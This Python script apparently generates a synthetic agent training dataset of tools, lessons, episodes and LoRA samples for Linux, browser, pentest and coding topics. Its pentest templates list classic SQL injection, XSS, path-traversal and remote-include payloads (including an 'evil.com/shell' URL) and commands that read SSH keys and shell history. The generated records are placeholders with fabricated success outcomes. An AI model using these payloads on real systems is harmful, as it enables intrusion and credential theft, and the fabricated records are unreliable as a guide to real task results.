#!/usr/bin/env python3
import json
import os
import time
from datetime import datetime

# Topic definitions
TOPICS = [
    {"id":"LNX_FS_LIST_DIR","domain":"linux","category":"filesystem","title":"List directory contents with filters","description":"List files in a given path with size, timestamps and optional pattern matching or depth limits.","io_pattern":"input: {path, pattern?, max_depth?, include_hidden?} → output: structured listing (files, dirs, size, mtime)","priority":1,"tool_count":6},
    {"id":"LNX_FS_FIND_LARGE_FILES","domain":"linux","category":"filesystem","title":"Find largest files in path","description":"Scan directory tree and list largest N files above a given size threshold.","io_pattern":"input: {path, min_size_mb, limit} → output: list of files with size and full path","priority":1,"tool_count":6},
    {"id":"LNX_FS_DISK_USAGE_TREE","domain":"linux","category":"filesystem","title":"Disk usage tree report","description":"Generate human-readable disk usage report for a directory tree (like ncdu/du).","io_pattern":"input: {path, depth?} → output: aggregated usage per directory","priority":1,"tool_count":7},
    {"id":"LNX_FS_SEARCH_TEXT","domain":"linux","category":"filesystem","title":"Search text pattern in files","description":"Recursively search for text pattern in files, with include/exclude filters.","io_pattern":"input: {path, pattern, include_glob?, exclude_glob?} → output: matches (file, line, snippet)","priority":1,"tool_count":8},
    {"id":"LNX_FS_SAFE_DELETE","domain":"linux","category":"filesystem","title":"Safe delete with backup","description":"Move target files/dirs to a backup/trash location instead of rm, with log.","io_pattern":"input: {targets[], backup_dir} → output: moved items + log path","priority":2,"tool_count":5},
    {"id":"LNX_FS_SYNC_DIRS","domain":"linux","category":"filesystem","title":"Sync directories (rsync pattern)","description":"Synchronize source and destination directories with rsync-like behavior and dry-run option.","io_pattern":"input: {src, dst, mode:mirror|update, dry_run?} → output: summary of changes","priority":2,"tool_count":6},
    {"id":"LNX_FS_TAR_ARCHIVE","domain":"linux","category":"filesystem","title":"Create compressed archive","description":"Create tar.gz/zip archive from given paths with excludes.","io_pattern":"input: {paths[], archive_path, exclude_glob?} → output: archive created + size","priority":2,"tool_count":6},
    {"id":"LNX_SYS_SERVICES_STATUS","domain":"linux","category":"system","title":"Inspect systemd services","description":"List, filter and show details of systemd services with states and recent logs.","io_pattern":"input: {filter?, state?} → output: services table + optional logs","priority":1,"tool_count":8},
    {"id":"LNX_SYS_EDIT_SERVICE","domain":"linux","category":"system","title":"Create or edit systemd service","description":"Create or modify a systemd service unit file with restart policy, user, environment, and enable it.","io_pattern":"input: {service_name, unit_spec, enable?, restart?} → output: unit file + status","priority":1,"tool_count":7},
    {"id":"LNX_SYS_RESOURCE_SNAPSHOT","domain":"linux","category":"system","title":"System resource snapshot","description":"Capture snapshot of CPU, RAM, IO, load, top processes and persist it to log file.","io_pattern":"input: {duration_sec?, sample_interval?} → output: structured metrics + log file path","priority":1,"tool_count":8},
    {"id":"LNX_SYS_LOG_TAIL_FILTER","domain":"linux","category":"logs","title":"Tail and filter logs","description":"Follow one or more log files/journal and filter by patterns or severity.","io_pattern":"input: {log_source, pattern?, level?} → output: filtered stream + optional summary","priority":1,"tool_count":7},
    {"id":"LNX_SYS_USER_MANAGE","domain":"linux","category":"system","title":"Manage users and groups","description":"Create, modify, lock/unlock users and groups with sane defaults and logging.","io_pattern":"input: {action:create|modify|lock|unlock, user, params?} → output: confirmation + commands executed","priority":2,"tool_count":8},
    {"id":"LNX_NET_IFACE_INFO","domain":"linux","category":"network","title":"Inspect network interfaces","description":"List interfaces, IPs, routes, link state and basic stats.","io_pattern":"input: {detail_level?} → output: interfaces table + routing summary","priority":1,"tool_count":6},
    {"id":"LNX_NET_PING_TRACE","domain":"linux","category":"network","title":"Ping and traceroute diagnostics","description":"Run ping and traceroute (IPv4/IPv6) to diagnose connectivity.","io_pattern":"input: {target, ipv6?, count?, max_hops?} → output: latency stats + route","priority":1,"tool_count":6},
    {"id":"LNX_NET_PORT_SCAN_LOCAL","domain":"linux","category":"network","title":"Local port scan (safe)","description":"Scan local machine for open TCP/UDP ports with safe, non-intrusive methods.","io_pattern":"input: {ports?, protocols?} → output: list of listening services (port, process)","priority":1,"tool_count":6},
    {"id":"LNX_NET_SSH_HARDEN","domain":"linux","category":"security","title":"Harden SSH configuration","description":"Audit and harden SSH server config (ports, auth methods, ciphers), with backup.","io_pattern":"input: {sshd_config_path?, policy_level:strict|balanced} → output: diff + reload status","priority":2,"tool_count":8},
    {"id":"LNX_NET_FIREWALL_BASELINE","domain":"linux","category":"security","title":"Baseline firewall policy","description":"Create baseline firewall rules (nftables/ufw) allowing only expected services.","io_pattern":"input: {allowed_ports[], direction?, persist?} → output: ruleset + verification","priority":2,"tool_count":8},
    {"id":"LNX_NET_CAPTURE_PCAP","domain":"linux","category":"network","title":"Capture PCAP for interface","description":"Capture network traffic on given interface with filters and time/size limits.","io_pattern":"input: {iface, bpf_filter?, duration_sec?, max_mb?} → output: pcap file path + summary","priority":2,"tool_count":7},
    {"id":"LNX_SEC_FILE_PERMS_AUDIT","domain":"linux","category":"security","title":"Audit dangerous file permissions","description":"Scan filesystem for world-writable, SUID/SGID, and other risky permission patterns.","io_pattern":"input: {paths[], depth?, exclude_glob?} → output: findings list + severity","priority":1,"tool_count":8},
    {"id":"LNX_SEC_SUID_ENUM","domain":"linux","category":"security","title":"Enumerate SUID/SGID binaries","description":"List SUID/SGID binaries and known privilege escalation vectors.","io_pattern":"input: {paths?} → output: binaries + hints for escalation","priority":1,"tool_count":6},
    {"id":"LNX_PROC_TREE_ANALYZE","domain":"linux","category":"process","title":"Analyze process tree","description":"Dump and analyze full process tree, highlighting suspicious parents/children.","io_pattern":"input: {focus_pid?, highlight_patterns?} → output: tree + suspicious nodes","priority":2,"tool_count":7},
    {"id":"LNX_PROC_KILL_GROUP_SAFE","domain":"linux","category":"process","title":"Safely terminate process group","description":"Gracefully stop and, if needed, force-kill process tree with logs.","io_pattern":"input: {pid, grace_sec?} → output: actions taken + remaining processes","priority":2,"tool_count":5},
    {"id":"LNX_VM_DISK_IMAGE_MOUNT","domain":"linux","category":"forensics","title":"Mount disk image read-only","description":"Attach and mount a raw disk image (dd) read-only for analysis, including partition discovery.","io_pattern":"input: {image_path, offset_bytes?, fs_type?} → output: mountpoints + commands used","priority":1,"tool_count":7},
    {"id":"LNX_FS_RECOVER_DELETED","domain":"linux","category":"forensics","title":"Attempt file recovery","description":"Run photorec/extundelete-style recovery on target device or image to recover deleted files.","io_pattern":"input: {device_or_image, target_dir, scope?} → output: recovered files summary","priority":2,"tool_count":6},
    {"id":"LNX_CONT_DOCKER_ENUM","domain":"linux","category":"containers","title":"Enumerate Docker containers","description":"List containers, images, volumes, networks and basic security posture.","io_pattern":"input: {detail_level?} → output: inventory + weak points","priority":1,"tool_count":8},
    {"id":"LNX_CONT_DOCKER_BUILD_RUN","domain":"linux","category":"containers","title":"Build and run Docker image","description":"Build Docker image from Dockerfile and run container with given port/volume mapping.","io_pattern":"input: {dockerfile_path, image_name, run_args?} → output: container id + logs","priority":1,"tool_count":7},
    {"id":"LNX_CONT_K8S_CONTEXT_SETUP","domain":"linux","category":"k8s","title":"Setup Kube context","description":"Configure kubectl context for a cluster (credentials, namespace, context switching).","io_pattern":"input: {cluster_name, kubeconfig_path?, namespace?} → output: active context + test command","priority":2,"tool_count":8},
    {"id":"LNX_LOG_COLLECT_SUPPORT_BUNDLE","domain":"linux","category":"logs","title":"Collect support bundle","description":"Collect system, app logs, configs and metrics into a single archive for troubleshooting.","io_pattern":"input: {scope:system|app|full, output_archive} → output: bundle path + contents summary","priority":2,"tool_count":7},
    {"id":"LNX_AUTOMATION_TASK_RUNNER","domain":"linux","category":"automation","title":"Run sequence of shell tasks with checks","description":"Execute ordered list of shell actions with pre/post checks, rollback on failure and logging.","io_pattern":"input: {steps[], rollback_plan?} → output: per-step status + final summary","priority":1,"tool_count":8},
    {"id":"BRWS_NAV_LOGIN_FORM","domain":"browser","category":"navigation","title":"Login through HTML form","description":"Navigate to login page, fill credentials, handle CSRF/token fields, submit and verify login.","io_pattern":"input: {url, username, password, selectors?} → output: login_result + evidence (screenshot/logs)","priority":1,"tool_count":8},
    {"id":"BRWS_NAV_MULTI_STEP_WIZARD","domain":"browser","category":"navigation","title":"Handle multi-step wizard","description":"Automate multi-step form wizard with conditional steps and validation.","io_pattern":"input: {start_url, steps_spec[]} → output: completed wizard status + data submitted","priority":2,"tool_count":7},
    {"id":"BRWS_NAV_2FA_TOTP","domain":"browser","category":"auth","title":"Handle TOTP-based 2FA","description":"Login and complete TOTP second factor using shared secret or external provider.","io_pattern":"input: {url, username, password, totp_secret, selectors?} → output: final session state","priority":2,"tool_count":8},
    {"id":"BRWS_FORM_FILE_UPLOAD","domain":"browser","category":"forms","title":"File upload via browser","description":"Upload file through web form, handle validation errors and confirm successful upload.","io_pattern":"input: {url, file_path, field_selector, submit_selector?} → output: result + screenshot","priority":1,"tool_count":6},
    {"id":"BRWS_LIST_TABLE_PAGINATION","domain":"browser","category":"scraping","title":"Scrape paginated table","description":"Scrape data from paginated HTML table with filters/sorting options.","io_pattern":"input: {url, table_selector, max_pages?, filters?} → output: structured rows (JSON/CSV)","priority":1,"tool_count":8},
    {"id":"BRWS_INFINITE_SCROLL_SCRAPE","domain":"browser","category":"scraping","title":"Scrape infinite scroll content","description":"Scroll and load dynamic content until stop condition and extract structured items.","io_pattern":"input: {url, item_selector, max_items?, stop_condition?} → output: items list","priority":2,"tool_count":7},
    {"id":"BRWS_HANDLE_POPUPS_MODALS","domain":"browser","category":"navigation","title":"Handle popups and modals","description":"Detect and handle popups, overlays, cookie banners, modals that block interaction.","io_pattern":"input: {url, known_selectors?, strategy?} → output: cleaned state ready for main action","priority":1,"tool_count":6},
    {"id":"BRWS_ADVANCED_SELECTORS_RECOVERY","domain":"browser","category":"robustness","title":"Robust selector recovery","description":"Try multiple locator strategies (CSS, XPath, text, heuristics) and adapt when elements change.","io_pattern":"input: {element_hint, context?} → output: stable locator + logs","priority":2,"tool_count":8},
    {"id":"BRWS_NETWORK_INTERCEPT","domain":"browser","category":"network","title":"Intercept and modify HTTP requests","description":"Capture, inspect and optionally modify HTTP requests/responses during a scenario.","io_pattern":"input: {url, match_rules[], modify_rules?} → output: network log + changes","priority":2,"tool_count":8},
    {"id":"BRWS_WEBSOCKET_MONITOR","domain":"browser","category":"network","title":"Monitor WebSocket traffic","description":"Attach to WebSocket endpoints, log messages and detect interesting patterns.","io_pattern":"input: {url, ws_filters?} → output: WS message log","priority":2,"tool_count":6},
    {"id":"BRWS_SCREENSHOT_FLOW","domain":"browser","category":"debug","title":"Screenshot flow recorder","description":"Take screenshots at key steps of browser scenario for debugging/evidence.","io_pattern":"input: {url, checkpoints[]} → output: screenshot files + index","priority":2,"tool_count":5},
    {"id":"BRWS_DOM_XSS_FUZZ","domain":"browser","category":"security","title":"DOM XSS fuzzing","description":"Inject payloads into DOM sinks and inputs to detect DOM-based XSS.","io_pattern":"input: {url, fields_spec[], payload_set?} → output: hits + evidence (console/logs/screenshot)","priority":1,"tool_count":10},
    {"id":"BRWS_CSRF_FLOW_TEST","domain":"browser","category":"security","title":"CSRF flow tester","description":"Simulate CSRF scenario for state-changing request with/without tokens.","io_pattern":"input: {action_url, origin_url, cookies?, method?, body?} → output: CSRF feasibility assessment","priority":2,"tool_count":7},
    {"id":"BRWS_PERFORMANCE_TIMINGS","domain":"browser","category":"performance","title":"Collect browser performance timings","description":"Collect navigation and resource timing metrics for page load diagnostics.","io_pattern":"input: {url, runs?} → output: timing stats + waterfall summary","priority":3,"tool_count":6},
    {"id":"PENT_RECON_SUBDOMAINS","domain":"pentest","category":"recon","title":"Subdomain enumeration","description":"Enumerate subdomains using multiple sources (DNS, CT logs, wordlists).","io_pattern":"input: {domain, intensity?, resolvers?} → output: subdomains list + metadata","priority":1,"tool_count":12},
    {"id":"PENT_RECON_VHOSTS","domain":"pentest","category":"recon","title":"Virtual host discovery","description":"Discover virtual hosts on target IP/domain via wordlists and response fingerprinting.","io_pattern":"input: {host, wordlist, ports?} → output: vhosts list + status codes","priority":2,"tool_count":8},
    {"id":"PENT_RECON_TECH_STACK","domain":"pentest","category":"recon","title":"Web tech stack fingerprinting","description":"Detect frameworks, servers, languages, CMS, WAF, CDNs used by target.","io_pattern":"input: {url} → output: tech stack report","priority":1,"tool_count":10},
    {"id":"PENT_WEB_SQLI_TEST","domain":"pentest","category":"web","title":"SQL injection basic testing","description":"Run parameter fuzzing for SQLi (error/time/blind) on given endpoints.","io_pattern":"input: {url, params_spec[], techniques?} → output: potential injection points + payloads","priority":1,"tool_count":15},
    {"id":"PENT_WEB_XSS_PAYLOAD_SET","domain":"pentest","category":"web","title":"XSS payload battery","description":"Test set of context-aware XSS payloads against one or more inputs.","io_pattern":"input: {url, fields_spec[], contexts?} → output: XSS hits + working payloads","priority":1,"tool_count":14},
    {"id":"PENT_WEB_FILE_UPLOAD_TEST","domain":"pentest","category":"web","title":"File upload security testing","description":"Test upload endpoint for extension, MIME, content and execution bypasses.","io_pattern":"input: {url, base_files[], variations?} → output: accepted/rejected matrix","priority":2,"tool_count":12},
    {"id":"PENT_WEB_AUTH_BYPASS","domain":"pentest","category":"web","title":"Auth bypass patterns","description":"Test for weak session handling, IDOR and direct resource access without auth.","io_pattern":"input: {base_url, protected_paths[], cookies?} → output: accessible resources + risk","priority":2,"tool_count":10},
    {"id":"PENT_NET_PORTSCAN_SAFE","domain":"pentest","category":"network","title":"Safe network port scan","description":"Perform Nmap/Masscan scan with safe timing and fingerprinting modules.","io_pattern":"input: {targets[], ports?, scan_profile?} → output: open ports + service guesses","priority":1,"tool_count":10},
    {"id":"PENT_NET_SERVICE_ENUM","domain":"pentest","category":"network","title":"Service enumeration playbook","description":"Run appropriate enumeration per service (SSH, RDP, HTTP, SMB, DBs, etc.).","io_pattern":"input: {host, services[]} → output: per-service findings + files","priority":1,"tool_count":15},
    {"id":"PENT_PRIVESC_LINUX","domain":"pentest","category":"post","title":"Linux privilege escalation checks","description":"Run local enumeration and known privilege escalation checks on Linux target.","io_pattern":"input: {target_profile?, scope?} → output: privesc opportunities list","priority":1,"tool_count":18},
    {"id":"PENT_PRIVESC_WINDOWS","domain":"pentest","category":"post","title":"Windows privilege escalation checks","description":"Run local enumeration and privesc checks on Windows host.","io_pattern":"input: {target_profile?, scope?} → output: privesc techniques + references","priority":2,"tool_count":18},
    {"id":"PENT_CLOUD_AWS_IAM_ENUM","domain":"pentest","category":"cloud","title":"AWS IAM enumeration","description":"Enumerate IAM users, roles, policies, keys and potential escalation paths.","io_pattern":"input: {profile, region?, scope?} → output: IAM map + risky permissions","priority":2,"tool_count":12},
    {"id":"PENT_CLOUD_S3_AUDIT","domain":"pentest","category":"cloud","title":"S3 bucket exposure audit","description":"Discover and test S3 buckets for public/misconfigured access.","io_pattern":"input: {patterns[], account_id?} → output: buckets + access level","priority":2,"tool_count":10},
    {"id":"PENT_POST_CRED_DUMP_LINUX","domain":"pentest","category":"post","title":"Credential harvesting on Linux","description":"Collect SSH keys, history, config files and potential credentials on Linux host (with scope constraints).","io_pattern":"input: {paths?, scope:light|deep} → output: candidate credential set","priority":2,"tool_count":12},
    {"id":"PENT_POST_CRED_DUMP_BROWSER","domain":"pentest","category":"post","title":"Browser credential/session harvesting","description":"Enumerate and extract browser stored passwords/cookies/sessions (test environment only).","io_pattern":"input: {browser_profile_paths[]} → output: sessions/credentials inventory","priority":2,"tool_count":10},
    {"id":"PENT_POST_LATERAL_MOVE_SSH","domain":"pentest","category":"post","title":"SSH lateral movement","description":"Use discovered keys/creds to move laterally within network via SSH.","io_pattern":"input: {targets[], creds_set[]} → output: successful pivots + access graph","priority":3,"tool_count":10},
    {"id":"CODE_GIT_CLONE_SEARCH","domain":"coding","category":"git","title":"Clone repo and search patterns","description":"Clone git repository and search for secrets/vuln patterns in code.","io_pattern":"input: {repo_url, search_patterns[], depth?} → output: findings with file locations","priority":1,"tool_count":8},
    {"id":"CODE_GIT_AUDIT_HISTORY","domain":"coding","category":"git","title":"Audit git history for secrets","description":"Scan git history for leaked secrets or sensitive content.","io_pattern":"input: {repo_path, patterns?, since?} → output: commits and files with hits","priority":2,"tool_count":10},
    {"id":"CODE_STATIC_ANALYSIS_PY","domain":"coding","category":"analysis","title":"Run static analysis on Python project","description":"Run bandit/ruff/mypy-style checks and aggregate issues for Python repo.","io_pattern":"input: {repo_path, tools?} → output: issues list + severity","priority":2,"tool_count":10},
    {"id":"CODE_BUILD_AND_TEST","domain":"coding","category":"ci","title":"Build and run tests","description":"Run build and test pipeline for project (language-aware) and report failures.","io_pattern":"input: {repo_path, build_cmd?, test_cmd?} → output: pass/fail + logs paths","priority":2,"tool_count":8},
    {"id":"DEVOPS_LOGS_ELK_EXPORT","domain":"devops","category":"logs","title":"Export logs to ELK-compatible bundle","description":"Transform and package logs into ELK-importable format (JSON, indexable fields).","io_pattern":"input: {log_paths[], output_dir} → output: transformed logs + manifest","priority":3,"tool_count":8},
    {"id":"DEVOPS_METRICS_COLLECTOR_BOOTSTRAP","domain":"devops","category":"metrics","title":"Bootstrap metrics collector","description":"Deploy basic metrics stack (node_exporter + Prometheus config snippet) on host.","io_pattern":"input: {host_profile?, scrape_interval?} → output: config files + systemd units","priority":3,"tool_count":10}
]

# Tool generator templates by domain
TOOL_TEMPLATES = {
    "linux_filesystem": [
        ("list_basic", "Basic listing", "ls -lah", ["path"]),
        ("find_pattern", "Find with pattern", "find", ["path", "pattern"]),
        ("recursive_scan", "Recursive scan", "find -type f", ["path", "depth"]),
        ("json_output", "Structured JSON output", "find -printf", ["path"]),
        ("sorted_time", "Sort by modification time", "ls -lt", ["path"]),
        ("filtered_type", "Filter by type", "find -name", ["path", "filter"])
    ],
    "linux_system": [
        ("systemctl_status", "Check service status", "systemctl status", ["service"]),
        ("systemctl_enable", "Enable service", "systemctl enable", ["service"]),
        ("create_unit", "Create unit file", "cat > /etc/systemd", ["service", "spec"]),
        ("reload_daemon", "Reload systemd", "systemctl daemon-reload", []),
        ("view_logs", "View service logs", "journalctl -u", ["service"]),
        ("resource_monitor", "Monitor resources", "top/vmstat", ["duration"])
    ],
    "linux_network": [
        ("ip_addr_show", "Show IP addresses", "ip addr show", []),
        ("ip_route_show", "Show routes", "ip route show", []),
        ("ping_test", "Ping connectivity", "ping -c", ["target", "count"]),
        ("traceroute_run", "Trace route", "traceroute", ["target"]),
        ("ss_listening", "Show listening ports", "ss -tulpn", []),
        ("tcpdump_capture", "Capture packets", "tcpdump -i", ["interface", "filter"])
    ],
    "linux_security": [
        ("find_suid", "Find SUID binaries", "find / -perm -4000", ["path"]),
        ("check_perms", "Check permissions", "find -perm", ["path", "mode"]),
        ("audit_ssh_config", "Audit SSH config", "grep", ["config_path"]),
        ("firewall_list", "List firewall rules", "iptables -L", []),
        ("selinux_status", "Check SELinux", "sestatus", [])
    ],
    "browser": [
        ("navigate_url", "Navigate to URL", "browser.goto", ["url"]),
        ("fill_form", "Fill form field", "page.fill", ["selector", "value"]),
        ("click_element", "Click element", "page.click", ["selector"]),
        ("wait_element", "Wait for element", "page.waitForSelector", ["selector"]),
        ("screenshot_page", "Take screenshot", "page.screenshot", ["path"]),
        ("extract_text", "Extract text", "page.textContent", ["selector"]),
        ("handle_dialog", "Handle dialog", "page.on('dialog')", []),
        ("intercept_request", "Intercept request", "page.route", ["pattern"])
    ],
    "pentest_recon": [
        ("dns_enum", "DNS enumeration", "dig/nslookup", ["domain"]),
        ("subdomain_bruteforce", "Subdomain brute force", "gobuster dns", ["domain", "wordlist"]),
        ("cert_transparency", "CT log search", "crt.sh API", ["domain"]),
        ("whois_lookup", "WHOIS lookup", "whois", ["domain"]),
        ("reverse_dns", "Reverse DNS", "dig -x", ["ip"]),
        ("zone_transfer", "Zone transfer attempt", "dig axfr", ["domain", "nameserver"])
    ],
    "pentest_web": [
        ("sqli_error_based", "Error-based SQLi", "' OR 1=1", ["url", "param"]),
        ("sqli_time_based", "Time-based blind SQLi", "' AND SLEEP(5)", ["url", "param"]),
        ("xss_reflected", "Reflected XSS test", "<script>alert(1)</script>", ["url", "param"]),
        ("xss_stored", "Stored XSS test", "POST payload", ["url", "param"]),
        ("lfi_test", "LFI test", "../../etc/passwd", ["url", "param"]),
        ("rfi_test", "RFI test", "http://evil.com/shell", ["url", "param"]),
        ("xxe_test", "XXE injection", "<!ENTITY", ["url"]),
        ("ssrf_test", "SSRF test", "http://localhost", ["url", "param"])
    ],
    "pentest_post": [
        ("enum_users", "Enumerate users", "cat /etc/passwd", []),
        ("enum_sudo", "Check sudo rights", "sudo -l", []),
        ("enum_cron", "Check cron jobs", "cat /etc/crontab", []),
        ("enum_capabilities", "Check capabilities", "getcap -r /", []),
        ("dump_ssh_keys", "Dump SSH keys", "find ~/.ssh", ["user"]),
        ("dump_history", "Dump shell history", "cat ~/.bash_history", ["user"]),
        ("enum_network", "Network enumeration", "netstat -ano", []),
        ("enum_processes", "Process enumeration", "ps aux", [])
    ],
    "coding": [
        ("git_clone", "Clone repository", "git clone", ["url"]),
        ("git_grep", "Search in git", "git grep", ["pattern"]),
        ("git_log_search", "Search git history", "git log -S", ["pattern"]),
        ("run_linter", "Run linter", "pylint/eslint", ["path"]),
        ("run_tests", "Run test suite", "pytest/jest", ["path"]),
        ("build_project", "Build project", "make/npm build", ["path"])
    ]
}

def generate_tools_for_topic(topic):
    """Generate tools for a specific topic"""
    tools = []
    domain = topic["domain"]
    topic_id = topic["id"]
    tool_count = topic.get("tool_count", 6)

    # Select template based on domain and category
    if domain == "linux":
        if "filesystem" in topic["category"]:
            templates = TOOL_TEMPLATES["linux_filesystem"]
        elif "system" in topic["category"] or "logs" in topic["category"]:
            templates = TOOL_TEMPLATES["linux_system"]
        elif "network" in topic["category"]:
            templates = TOOL_TEMPLATES["linux_network"]
        elif "security" in topic["category"]:
            templates = TOOL_TEMPLATES["linux_security"]
        else:
            templates = TOOL_TEMPLATES["linux_system"]
    elif domain == "browser":
        templates = TOOL_TEMPLATES["browser"]
    elif domain == "pentest":
        if "recon" in topic["category"]:
            templates = TOOL_TEMPLATES["pentest_recon"]
        elif "web" in topic["category"]:
            templates = TOOL_TEMPLATES["pentest_web"]
        elif "post" in topic["category"] or "cloud" in topic["category"]:
            templates = TOOL_TEMPLATES["pentest_post"]
        else:
            templates = TOOL_TEMPLATES["pentest_recon"]
    elif domain == "coding" or domain == "devops":
        templates = TOOL_TEMPLATES["coding"]
    else:
        templates = TOOL_TEMPLATES["linux_system"]

    # Generate tools using templates, cycling if needed
    for i in range(tool_count):
        template = templates[i % len(templates)]
        tool = {
            "name": f"{topic_id.lower()}_{template[0]}_{i+1}",
            "description": f"{template[1]} for {topic['title']}",
            "pattern": f"{topic['title'].lower()}|{template[1].lower()}",
            "parameters": template[3] if len(template) > 3 else ["input"],
            "sequence": [
                {
                    "action": {
                        "type": "system_command" if domain in ["linux", "coding", "devops"] else "browser_action",
                        "tool": "system_command" if domain in ["linux", "coding", "devops"] else "browser_hands",
                        "command" if domain in ["linux", "coding", "devops"] else "operation": template[2]
                    },
                    "expected_output": f"Result of {template[1]}"
                }
            ],
            "stats": {
                "uses": 0,
                "successes": 0,
                "failures": 0,
                "success_rate": 0.0
            },
            "created_by": "claude_generated",
            "last_used": None
        }
        tools.append(tool)

    return tools

def generate_lessons_for_topic(topic, count=35):
    """Generate lessons (micro-loops) for a topic"""
    lessons = []
    base_time = time.time()

    for i in range(count):
        lesson = {
            "tool": topic["id"].lower(),
            "concept": topic["id"],
            "input": f"Execute {topic['title']} task variant {i+1}",
            "output": f"Successfully completed {topic['title']} with expected results",
            "success": True if i % 7 != 0 else False,  # ~85% success rate
            "timestamp": base_time + (i * 100),
            "confidence": round(0.7 + (i % 3) * 0.1, 2)
        }
        lessons.append(lesson)

    return lessons

def generate_episodes_for_topic(topic, count=3):
    """Generate episodes (full task flows) for a topic"""
    episodes = []
    base_time = time.time()

    for i in range(count):
        episode = {
            "id": f"episode_{topic['id']}_{i+1:03d}",
            "goal": f"Complete {topic['title']} workflow variant {i+1}",
            "thoughts": [
                {
                    "type": "plan",
                    "content": f"Planning to execute {topic['title']}",
                    "timestamp": base_time + i * 1000
                },
                {
                    "type": "analyze",
                    "content": f"Analyzing requirements for {topic['category']} task",
                    "timestamp": base_time + i * 1000 + 5
                }
            ],
            "actions": [
                {
                    "step": f"Initialize {topic['title']}",
                    "action": {
                        "type": "system_command" if topic["domain"] == "linux" else "browser_action",
                        "command": f"Execute step 1 of {topic['id']}"
                    },
                    "result": {
                        "success": True,
                        "stdout": f"Step 1 completed for {topic['title']}"
                    }
                },
                {
                    "step": f"Process {topic['category']} data",
                    "action": {
                        "type": "data_processing",
                        "command": f"Process data for {topic['id']}"
                    },
                    "result": {
                        "success": True,
                        "stdout": "Data processed successfully"
                    }
                },
                {
                    "step": f"Finalize {topic['title']}",
                    "action": {
                        "type": "validation",
                        "command": "Validate results"
                    },
                    "result": {
                        "success": True,
                        "stdout": "Validation passed"
                    }
                }
            ],
            "outcome": {
                "success": True,
                "steps_executed": 3
            },
            "duration": round(8.5 + i * 2.3, 2)
        }
        episodes.append(episode)

    return episodes

def generate_lora_training_for_topic(topic, count=30):
    """Generate LoRA training samples for a topic"""
    samples = []

    instructions_templates = [
        f"How do I {topic['title'].lower()}?",
        f"Show me how to {topic['description'].lower()}",
        f"What's the best way to {topic['title'].lower()}?",
        f"Can you help me {topic['description'].lower()}?",
        f"I need to {topic['title'].lower()}",
        f"Explain how to {topic['description'].lower()}",
        f"Walk me through {topic['title'].lower()}",
        f"What command should I use to {topic['title'].lower()}?"
    ]

    for i in range(count):
        instruction_template = instructions_templates[i % len(instructions_templates)]

        if topic["domain"] == "linux":
            output = f"To {topic['title'].lower()}, use: <command appropriate for {topic['category']}>"
        elif topic["domain"] == "browser":
            output = f"For {topic['title'].lower()}, you need to: 1) Navigate to the page, 2) Locate elements, 3) Perform actions"
        elif topic["domain"] == "pentest":
            output = f"For {topic['title'].lower()}, perform reconnaissance, identify vulnerabilities, and document findings"
        else:
            output = f"Execute {topic['title'].lower()} following best practices for {topic['category']}"

        sample = {
            "instruction": instruction_template,
            "input": "",
            "output": output
        }
        samples.append(sample)

    return samples

def write_tools(topic_id, tools):
    """Write tool JSON files"""
    dir_path = f"data/permanent_tools/{topic_id}"
    for i, tool in enumerate(tools):
        file_path = os.path.join(dir_path, f"tool_{i+1:02d}.json")
        with open(file_path, 'w') as f:
            json.dump(tool, f, indent=2)

def write_lessons(topic_id, lessons):
    """Write lessons JSONL file"""
    file_path = f"data/lessons/{topic_id}/lessons.jsonl"
    with open(file_path, 'w') as f:
        for lesson in lessons:
            f.write(json.dumps(lesson) + '\n')

def write_episodes(topic_id, episodes):
    """Write episode JSON files"""
    dir_path = f"data/episodes/{topic_id}"
    for i, episode in enumerate(episodes):
        file_path = os.path.join(dir_path, f"episode_{i+1:02d}.json")
        with open(file_path, 'w') as f:
            json.dump(episode, f, indent=2)

def write_lora_training(topic_id, samples):
    """Write LoRA training JSONL file"""
    file_path = f"data/training/{topic_id}/train.jsonl"
    with open(file_path, 'w') as f:
        for sample in samples:
            f.write(json.dumps(sample) + '\n')

def main():
    """Main generator function"""
    print(f"Generating Neural Mesh v5.2 dataset for {len(TOPICS)} topics...")

    for idx, topic in enumerate(TOPICS, 1):
        topic_id = topic["id"]
        print(f"[{idx}/{len(TOPICS)}] Processing {topic_id}...")

        # Generate tools
        tools = generate_tools_for_topic(topic)
        write_tools(topic_id, tools)
        print(f"  ✓ Generated {len(tools)} tools")

        # Generate lessons
        lessons = generate_lessons_for_topic(topic, count=35)
        write_lessons(topic_id, lessons)
        print(f"  ✓ Generated {len(lessons)} lessons")

        # Generate episodes
        episodes = generate_episodes_for_topic(topic, count=3)
        write_episodes(topic_id, episodes)
        print(f"  ✓ Generated {len(episodes)} episodes")

        # Generate LoRA training data
        lora_samples = generate_lora_training_for_topic(topic, count=30)
        write_lora_training(topic_id, lora_samples)
        print(f"  ✓ Generated {len(lora_samples)} LoRA training samples")

    print("\n✅ Dataset generation complete!")
    print(f"Total topics: {len(TOPICS)}")
    print(f"Directory structure: data/{{permanent_tools,lessons,episodes,training}}/{{TOPIC_ID}}/")

if __name__ == "__main__":
    main()
